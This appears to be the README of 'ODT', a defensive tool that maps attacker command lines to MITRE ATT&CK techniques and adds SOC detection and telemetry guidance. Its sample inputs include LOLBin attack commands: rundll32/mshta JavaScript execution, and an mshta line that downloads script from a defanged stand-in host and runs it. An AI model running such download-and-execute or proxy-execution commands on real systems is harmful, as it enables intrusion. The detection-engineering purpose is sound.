# ODT - Offensive–Defensive Translator

## 📋 Table of Contents

- [Overview](#-overview)
- [Problem Statement](#-problem-statement)
- [Features](#-features)
- [Requirements](#-requirements)
- [Installation](#-installation)
- [Project Structure](#-project-structure)
- [Usage](#-usage)
- [Examples](#-examples)
- [Architecture](#-architecture)
- [Testing](#-testing)
- [Use Cases](#-use-cases)
- [Design Principles](#-design-principles)
- [Roadmap](#-roadmap)
- [Documentation](#-documentation)
- [Project Status](#-project-status)
- [Disclaimer](#-disclaimer)

---

## 🎯 Overview

**Offensive–Defensive Translator (ODT)** is a cybersecurity analysis and enrichment engine designed to systematically translate offensive tradecraft into actionable defensive intelligence. Its primary objective is to bridge the cognitive and operational gap between how attackers operate (red team / adversary perspective) and how defenders detect, investigate, and respond to threats (blue team / SOC perspective).

ODT is designed for **SOC analysts**, **detection engineers**, **threat hunters**, and anyone working with **offensive security artifacts**.

Rather than treating offensive commands or techniques as isolated indicators, the project contextualizes them within:

- 🎯 The **MITRE ATT&CK framework**
- 📊 Relevant **telemetry sources** (endpoint, network, logs)
- 🛡️ **Defensive detection and response considerations**

The output is structured, machine-readable, and suitable for use in detection engineering, alert triage, threat hunting, and educational contexts.

---

## 🔍 Problem Statement

Offensive knowledge is abundant in cybersecurity: blogs, proof-of-concepts, red team reports, malware analyses, and exploit write-ups. However, this information is often:

- 📝 Unstructured
- ⚔️ Attacker-centric
- 🔌 Disconnected from how SOC teams actually monitor and defend environments

Conversely, defenders often work with alerts, logs, and detections without fully understanding the original attacker intent or technique behind them.

The **Offensive–Defensive Translator** addresses this mismatch by providing a deterministic way to translate offensive artifacts into defender-focused intelligence.

---

## ✨ Features

- 🔎 **Offensive Artifact Ingestion**  
  Analyze commands, LOLBins usage, and execution patterns from various sources

- 🧹 **Normalization & Intent Analysis**  
  Tokenize, clean, and extract attacker intent from raw commands

- 🎯 **MITRE ATT&CK Mapping**  
  Automatic mapping to MITRE ATT&CK tactics and techniques (T1059, T1218, T1027, T1105, T1071)

- 🔓 **Obfuscation Decoding**  
  Automatically decode PowerShell base64, JavaScript atob/fromCharCode, and URL encoding

- 📈 **Confidence Scoring**  
  Evidence-based scoring starting from baseline prior (0.5), adjusted by indicator diversity and match quality

- 🛡️ **Defensive Enrichment**  
  Comprehensive defensive context including:
  - Detection opportunities
  - Relevant telemetry sources
  - SOC analyst investigation notes
  - Defensive explanations

- 📁 **Structured JSON Output**  
  Machine-readable format suitable for automation, SIEM integration, and analysis workflows

- 🧪 **Comprehensive Testing**  
  84 tests (74 unit + 10 integration) covering normalization, confidence scoring, detection, decoding, and realistic attack chains (100% pass rate)

**Current Technique Coverage:**
- **Primary**: T1059 (Command and Scripting Interpreter)
- **Secondary** (optional): 
  - T1218 (System Binary Proxy Execution)
  - T1027 (Obfuscated Files or Information)
  - T1105 (Ingress Tool Transfer)
  - T1071 (Application Layer Protocol)

---

## ⚙️ Requirements

- **Python**: 3.6+ (3.8+ recommended)
- **Dependencies**: Listed in [requirements.txt](requirements.txt)

> 💡 No external API keys or databases required for basic functionality. MITRE ATT&CK data is cached locally.

---

## 🧰 Installation

### Prerequisites
Ensure Python 3.6+ is installed. On Windows:
```powershell
python --version  # Should be 3.6 or higher
```

On Linux (Ubuntu/Debian):
```bash
sudo apt install python3 python3-pip python3-venv
```

### Setup

1. **Clone the repository**:
```bash
git clone <repository-url>
cd OD-translator
```

2. **Create virtual environment** (recommended):
```bash
python -m venv venv
venv\Scripts\activate  # On Windows
source venv/bin/activate  # On Linux/macOS
```

3. **Install dependencies**:
```bash
pip install -r requirements.txt
```

4. **Install in development mode** (optional):
```bash
pip install -e .
```

---

## 📁 Project Structure

```
OD-translator/
├── README.md                           # This file
├── TODO.md                             # Development tasks and roadmap
├── changes_summary.md                  # Detailed changelog
├── requirements.txt                    # Python dependencies
├── LICENSE                             # Project license
│
├── src/                               # Main application directory
│   ├── __init__.py
│   │
│   ├── cli/                           # Command-line interface
│   │   ├── __init__.py
│   │   └── main.py                    # CLI entry point
│   │
│   ├── core/                          # Core analysis engine
│   │   ├── __init__.py
│   │   ├── decoder.py                 # Obfuscation decoder
│   │   ├── detector.py                # Technique detection
│   │   ├── mitre.py                   # MITRE ATT&CK integration
│   │   ├── output.py                  # Output formatting
│   │   ├── parser.py                  # Command parsing & normalization
│   │   └── pipeline.py                # Analysis pipeline orchestration
│   │
│   └── detection/                     # Detection rules & metadata
│       ├── __init__.py
│       ├── metadata.py                # Technique metadata
│       └── technique_pattern_db.py    # Detection pattern database
│
├── data/                              # Data storage
│   ├── mitre/                         # MITRE ATT&CK cache
│   │   └── attackcti_t1059.json      # Cached technique data
│   └── results/                       # Analysis output files
│       └── analysis_YYYYMMDD_HHMMSS.json
│
├── tests/                             # Unit test suite
│   ├── __init__.py
│   ├── README.md                      # Testing documentation
│   ├── test_parser.py                 # Normalization tests (10 tests)
│   ├── test_detector.py               # Detection tests (24 tests)
│   └── test_decoder.py                # Decoding tests (25 tests)
│
├── scripts/                           # Utility scripts
│   ├── build_mitre_db.py             # MITRE data fetcher
│   └── validate_output.py            # Output validation
│
└── docs/                              # Additional documentation
    ├── changes_summary.md
    ├── function_flow.mmd
    └── test_implementation_summary.md
```

---

## 🔧 Usage

Run the CLI module from the project root. The entry point is `src.cli.main`.

### Quick Help

View all available options and flags:
```bash
python src/cli/main.py --help
# or
python src/cli/main.py -h
```

### Basic Analysis

Analyze a single command:
```bash
python src/cli/main.py "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\""
```

> 💡 **Note**: The CLI accepts multi-part commands (joins all remaining args), so complex commands with spaces are handled correctly.

### Save Output to File

Use the `-o` or `--output` flag to save results with automatic timestamp:
```bash
python src/cli/main.py -o results.json "mshta.exe javascript:var s=new ActiveXObject('WScript.Shell');s.Run('cmd.exe /c whoami',0)"
```

Output saved to: `data/results/results_YYYYMMDD_HHMMSS.json`

### Decode Obfuscated Commands

Use the `-d` or `--decode` flag to automatically decode before analysis:
```bash
# PowerShell base64
python src/cli/main.py -d "powershell -encodedCommand RwBlAHQALQBQAHIAbwBjAGUAcwBzAA=="

# JavaScript atob
python src/cli/main.py --decode "mshta javascript:eval(atob('dGVzdA=='))"
```

**Supported encodings:**
- PowerShell base64 (`-encodedCommand`, `-enc`, `-e`)
- JavaScript atob/fromCharCode
- URL encoding

### Include Secondary Techniques

By default, only T1059 detections are emitted. To include all techniques (T1218, T1027):
```bash
python src/cli/main.py --include-secondary-techniques "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\""
```

### Analyze from Stdin

```bash
echo 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication"' | python src/cli/main.py
```

### PowerShell Quoting Tips

PowerShell parses quotes and parentheses before the CLI sees them. Use one of these patterns:

**Here-string (recommended):**
```powershell
@'
mshta.exe "javascript:var p='po'+'wer'+'shell';var w=new ActiveXObject('WScript.Shell');w.Run(p+' -c echo test',0)"
'@ | python src/cli/main.py
```

**Stop parsing with `--%`:**
```powershell
python --% src/cli/main.py mshta.exe "javascript:var p='po'+'wer'+'shell';var w=new ActiveXObject('WScript.Shell');w.Run(p+' -c echo test',0)"
```

### Refresh MITRE Cache

Force refresh the local MITRE ATT&CK cache:
```bash
python src/cli/main.py "whoami" --refresh-mitre
```

### Sync Official MITRE Technique Docs (Offline)

Download authoritative MITRE ATT&CK technique pages into `data/mitre_docs/` as both raw HTML and generated Markdown:
```bash
python scripts/sync_mitre_docs.py --all-from-rules --format both
```

This generates:
- `data/mitre_docs/html/<TECHNIQUE_ID>.html`
- `data/mitre_docs/markdown/<TECHNIQUE_ID>.md`
- `data/mitre_docs/manifest.json`

### VS Code Debugging

Use this launch configuration (`.vscode/launch.json`):
```jsonc
{
  "name": "ODT CLI (args)",
  "type": "debugpy",
  "request": "launch",
  "program": "${workspaceFolder}/src/cli/main.py",
  "console": "integratedTerminal",
  "redirectOutput": true,
  "args": [
    "mshta.exe \"javascript:var r=new ActiveXObject('MSXML2.XMLHTTP');r.open('GET','https://static-example[.]net/assets/app.js',0);r.send();if(r.status==200){new Function(r.responseText)();}\""
  ]
}
```

---

## 💡 Examples

### Example 1: LOLBin Proxy Execution

**Input:**
```text
rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication"
```

**Output (simplified):**
```json
{
  "input_command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"",
  "mitre_mapping": {
    "tactic": "Defense Evasion",
    "technique": "Signed Binary Proxy Execution",
    "technique_id": "T1218"
  },
  "analysis": {
    "attacker_intent": "Execute malicious code via a trusted Windows binary",
    "execution_context": "LOLBins abuse"
  },
  "defensive_enrichment": {
    "telemetry_sources": [
      "Sysmon Event ID 1 (Process Creation)",
      "Windows Event ID 4688 (Process Creation)"
    ],
    "detection_opportunities": [
      "Suspicious rundll32 command-line patterns",
      "Abnormal parent-child process relationships",
      "Rundll32 executing with javascript: protocol handler"
    ],
    "soc_notes": "Commonly used for fileless execution and phishing payloads"
  },
  "confidence": 0.78
}
```

### Example 2: Obfuscated PowerShell

**Input:**
```bash
python src/cli/main.py -d "powershell -encodedCommand RwBlAHQALQBQAHIAbwBjAGUAcwBzAA=="
```

**Decoded command:**
```powershell
Get-Process
```

**Output includes:**
- Decoded command text
- T1059.001 (PowerShell) detection
- Obfuscation indicators (T1027)
- Defensive context for base64-encoded commands

### Confidence Scoring Explained

The `confidence` value (0.0–1.0) reflects detection certainty based on:

- **Baseline prior**: Starts at 0.5
- **Evidence diversity**: Number and variety of matched indicators
- **Indicator quality**: Generic vs. specific matches
- **Behavior signals**: Command chaining, download patterns, suspicious arguments
- **Penalties**: Excessive reliance on generic tokens

**Example scoring:**
- `0.9–1.0`: High confidence (multiple specific indicators)
- `0.6–0.8`: Medium confidence (some specific + generic indicators)
- `0.3–0.5`: Low confidence (mostly generic indicators)

---

## 🏗️ Architecture

The project follows a **layered architecture** to ensure clarity, extensibility, and separation of concerns.

```
┌─────────────────────────────────────────────────┐
│         Input Layer                             │
│  Offensive Artifact (command/technique)         │
└─────────────────┬───────────────────────────────┘
                  ↓
┌─────────────────────────────────────────────────┐
│    Parsing & Normalization Layer                │
│  • Tokenization                                 │
│  • Cleanup & whitespace normalization           │
│  • Intent extraction                            │
│  • Obfuscation decoding (if enabled)            │
└─────────────────┬───────────────────────────────┘
                  ↓
┌─────────────────────────────────────────────────┐
│    Analysis & Mapping Layer                     │
│  • Technique detection (pattern matching)       │
│  • MITRE ATT&CK tactic & technique mapping      │
│  • Evidence extraction                          │
│  • Confidence scoring                           │
└─────────────────┬───────────────────────────────┘
                  ↓
┌─────────────────────────────────────────────────┐
│    Defensive Enrichment Layer                   │
│  • Detection logic explanations                 │
│  • Telemetry source identification              │
│  • SOC investigation context                    │
│  • Defensive recommendations                    │
└─────────────────┬───────────────────────────────┘
                  ↓
┌─────────────────────────────────────────────────┐
│         Output Layer                            │
│  Structured JSON (exportable, automatable)      │
└─────────────────────────────────────────────────┘
```

### Layer Details

#### 📥 Input Layer
- Accepts commands via CLI arguments, stdin, or file input
- Handles multi-part commands with complex quoting

#### 🧹 Parsing & Normalization Layer ([parser.py](src/core/parser.py))
- Normalizes whitespace and command structure
- Tokenizes command components
- Extracts execution intent
- Decodes obfuscation (PowerShell, JavaScript, URL encoding)

#### 🔍 Analysis & Mapping Layer ([detector.py](src/core/detector.py))
- Pattern-based technique detection
- Maps to MITRE ATT&CK framework via [mitre.py](src/core/mitre.py)
- Evidence-based confidence scoring
- Supports T1059, T1218, T1027, T1105, T1071 techniques

#### 🛡️ Defensive Enrichment Layer ([metadata.py](src/detection/metadata.py))
**This is the core differentiator of ODT.**

Answers critical questions:
- *What is the attacker trying to achieve?*
- *How would this activity manifest in logs or telemetry?*
- *Which data sources are most relevant for detection?*
- *What should a SOC analyst look for during investigation?*

Transforms raw attacker behavior into defender-oriented intelligence.

#### 📤 Output Layer ([output.py](src/core/output.py))
- Structured JSON format
- Timestamped file output to `data/results/`
- Machine-readable for automation and SIEM integration

### Pipeline Orchestration

The [pipeline.py](src/core/pipeline.py) module coordinates all layers, ensuring:
- **Decoupling**: Each layer operates independently
- **Extensibility**: New techniques and enrichments easily added
- **Testability**: Pure functions with no side effects
- **Composability**: Functions return structured data for chaining

---

## 🧪 Testing

### Install Test Dependencies

```bash
pip install -r requirements.txt
```

### Run All Unit Tests

```bash
pytest tests/
```

### Run Targeted Tests

```bash
# Test specific techniques
pytest tests/test_detector.py -k "t1105 or t1071"

# Test specific functions
pytest tests/test_detector.py -k "confidence"

# Verbose output
pytest tests/ -v
```

### Running Unit Tests

The project includes comprehensive unit tests covering:

- **📏 Command Normalization** (10 tests): Whitespace handling, edge cases, special characters
- **📊 Confidence Scoring** (14 tests): Evidence-based scoring, bonuses, penalties, edge cases
- **🎯 Technique Detection** (36 tests): T1059, T1218, T1027, T1105, T1071 detection with evidence extraction
- **🔓 Obfuscation Decoding** (25 tests): PowerShell base64, JavaScript atob/fromCharCode, URL encoding
- **🔗 Integration Tests** (1 test): Realistic attack chains with 100% detection accuracy

**Total: 86 tests (100% pass rate)**

### Run All Tests

```bash
pytest tests/ -v
```

### Expected Output

```
============================= test session starts =============================
platform win32 -- Python 3.11.9, pytest-9.0.2, pluggy-1.6.0
collected 86 items

tests/test_decoder.py::test_detect_encoding_powershell_base64 PASSED
tests/test_decoder.py::test_decode_powershell_base64_simple PASSED
...
tests/test_detector.py::test_score_confidence_zero_evidence PASSED
tests/test_detector.py::test_detect_t1059_mshta_javascript PASSED
tests/test_detector.py::test_detect_t1105_curl_download_output PASSED
tests/test_detector.py::test_detect_t1071_http_url_in_command PASSED
...
tests/test_parser.py::test_normalize_basic_whitespace PASSED
tests/test_parser.py::test_normalize_special_characters PASSED
...
tests/test_realistic_commands.py::test_realistic_commands PASSED

============================= 86 passed in 0.44s ==============================
```

### Test Details

Each test validates detection functions independently by:
- Creating mock input data
- Calling analysis functions
- Asserting on returned data structures
- Verifying confidence scores and evidence extraction

**No side effects, no file I/O, pure business logic testing.**

For detailed testing documentation, see [tests/README.md](tests/README.md).

---

## 🎯 Use Cases

- **👩‍💻 SOC Analysts**  
  Improve alert triage and investigation context by understanding attacker intent and relevant telemetry

- **🔍 Detection Engineers**  
  Design detections grounded in attacker behavior with clear mapping to observable signals

- **🎯 Threat Hunters**  
  Pivot from known techniques to observable signals and telemetry sources

- **🎓 Students and Learners**  
  Understand how red team actions translate into blue team visibility and defensive operations

---

## 👨‍💻 Design Principles

- **🛡️ Defender-first mindset**  
  Outputs are optimized for blue team usage and SOC workflows

- **📊 Structured over narrative**  
  Machine-readable formats over prose for automation and integration

- **🔧 Extensibility**  
  New techniques, inputs, and enrichments can be added incrementally

- **✨ Clarity over completeness**  
  Focus on explainable, practical intelligence rather than exhaustive coverage

---

## 🛣️ Roadmap

### Phase 1 — Core Translator ✅ (Current)

- ✅ Command-based input support
- ✅ MITRE ATT&CK mapping (T1059, T1218, T1027, T1105, T1071)
- ✅ JSON output schema
- ✅ Defensive enrichment logic
- ✅ Obfuscation decoding
- ✅ Confidence scoring

### Phase 2 — Detection-Oriented Expansion

- 🔄 Predefined detection pattern library
- 🔄 Mapping to common EDR/SIEM telemetry
- 🔄 Improved process relationship analysis
- 🔄 Additional MITRE techniques (T1105, T1543, T1055)

### Phase 3 — Advanced Enrichment

- 💭 Correlation between multiple commands
- 💭 Technique chaining (attack paths)
- 💭 Enhanced confidence scoring with ML models
- 💭 Context-aware threat intelligence integration

### Phase 4 — Ecosystem Integration (Future)

- 🔮 Export formats for SIEM rules (Splunk, Elastic, Sentinel)
- 🔮 Sigma-like detection templates
- 🔮 Integration with threat intel feeds (MISP, OpenCTI)
- 🔮 Real-time command analysis API

**Legend**: ✅ Complete | 🔄 In Progress | 💭 Planned | 🔮 Future

---

## 📚 Documentation

- **[tests/README.md](tests/README.md)** - Detailed testing guide and test structure
- **[changes_summary.md](changes_summary.md)** - Detailed changelog and version history
- **[docs/function_flow.mmd](docs/function_flow.mmd)** - Mermaid diagram of function flow
- **[sample_commands.md](sample_commands.md)** - Sample offensive commands for testing
- **[data/mitre_docs/README.md](data/mitre_docs/README.md)** - Offline MITRE ATT&CK documentation sync workflow

---

## 🚧 Project Status

This project is under **active development** and is intentionally designed to evolve alongside the author's focus on:

- SOC operations
- Detection engineering
- Blue team workflows
- Threat hunting methodologies

**Contributions, ideas, and critical feedback are welcome!**

---

## ⚠️ Disclaimer

This project is intended strictly for **defensive, educational, and research purposes**.

**ODT does not:**
- Enable or facilitate malicious activity
- Provide exploitation tools or weaponized payloads
- Encourage unauthorized system access

**ODT is designed to:**
- ✅ Improve defensive security operations
- ✅ Educate security professionals on attacker tradecraft
- ✅ Support detection engineering and threat hunting
- ✅ Bridge the gap between offensive and defensive cybersecurity

Use responsibly and ethically.

---

## 📄 License

See [LICENSE](LICENSE) file for details.

---

## 🙏 Acknowledgments

- **MITRE ATT&CK** - For the comprehensive adversary tactics and techniques framework
- **Security research community** - For sharing offensive tradecraft that informs defensive practices

---

<div align="center">

**Built with 🛡️ for defenders by defenders**

</div>
